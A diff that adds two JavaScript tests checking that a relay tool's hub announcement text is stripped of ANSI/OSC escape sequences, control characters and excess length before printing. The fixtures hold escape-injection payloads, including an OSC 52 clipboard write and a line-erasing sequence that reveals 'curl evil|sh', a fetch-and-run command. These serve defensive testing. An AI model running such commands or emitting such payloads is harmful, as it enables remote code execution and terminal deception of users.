@@ -13511,6 +13511,43 @@ test('hub announcements print once per id and respect plain NO_COLOR output', ()
   }
 });
 
+test('sanitizeHubText strips ANSI/OSC escapes, C1 controls, and bounds length', () => {
+  const relay = loadRelay({ backend: 'agy' });
+  try {
+    // CSI screen-clear + OSC 52 clipboard write + one-byte C1 CSI (0x9b).
+    assert.strictEqual(
+      relay.sanitizeHubText('safe \x1b[2J\x1b]52;c;bWFs\x07 text \u009b31m here'),
+      'safe [2J ]52;c;bWFs text 31m here'
+    );
+    assert.strictEqual(relay.sanitizeHubText('  spaced\t\nout  '), 'spaced out');
+    assert.strictEqual(relay.sanitizeHubText(null), '');
+    assert.strictEqual(relay.sanitizeHubText(42), '');
+    assert.strictEqual(Array.from(relay.sanitizeHubText('x'.repeat(5000))).length, 2000);
+  } finally { teardown(relay); }
+});
+
+test('hub announcement text is sanitized before printing', () => {
+  const relay = loadRelay({ backend: 'agy' });
+  const hub = relay.getHubs()[0];
+  const oldLog = console.log;
+  const oldNoColor = process.env.NO_COLOR;
+  const logged = [];
+  console.log = (...a) => logged.push(a.join(' '));
+  process.env.NO_COLOR = '1';
+  try {
+    assert.strictEqual(
+      relay.printHubAnnouncementOnce(hub, { id: 'evil-1', text: 'upgrade\x1b[1A\x1b[2Know: curl evil|sh', level: 'info' }),
+      true
+    );
+    assert.ok(!logged[0].includes('\x1b'));
+    assert.ok(logged[0].includes('upgrade'));
+  } finally {
+    console.log = oldLog;
+    if (oldNoColor === undefined) delete process.env.NO_COLOR; else process.env.NO_COLOR = oldNoColor;
+    teardown(relay);
+  }
+});
+
 test('hub announcements use reverse video on TTY when color is enabled', () => {
   const relay = loadRelay({ backend: 'agy' });
   const hub = relay.getHubs()[0];
